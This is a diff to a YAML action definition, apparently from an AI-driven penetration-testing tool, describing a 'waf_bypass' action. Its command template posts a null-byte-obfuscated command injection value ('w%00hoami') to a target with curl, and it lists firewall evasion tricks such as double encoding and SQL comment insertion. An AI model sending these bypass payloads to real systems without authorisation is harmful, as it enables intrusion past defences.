@@ -2,15 +2,18 @@ name: waf_bypass
 category: web
 description: WAF bypass techniques
 preconditions:
-  - service.port==80
+- service.port==80
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "curl -s '{target_url}' -d 'cmd=w%00hoami'"
+command_template: curl -s '{target_url}' -d 'cmd=w%00hoami'
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "WAF bypasses: null byte (%00), double URL encoding, Unicode normalization, case variation, comment insertion (e.g., SEL/**/ECT), alternative syntax, chunked encoding."
+mechanism: 'WAF bypasses: null byte (%00), double URL encoding, Unicode normalization,
+  case variation, comment insertion (e.g., SEL/**/ECT), alternative syntax, chunked
+  encoding.'
+hacktricks_ref: pentesting-web/sql-injection/README.md
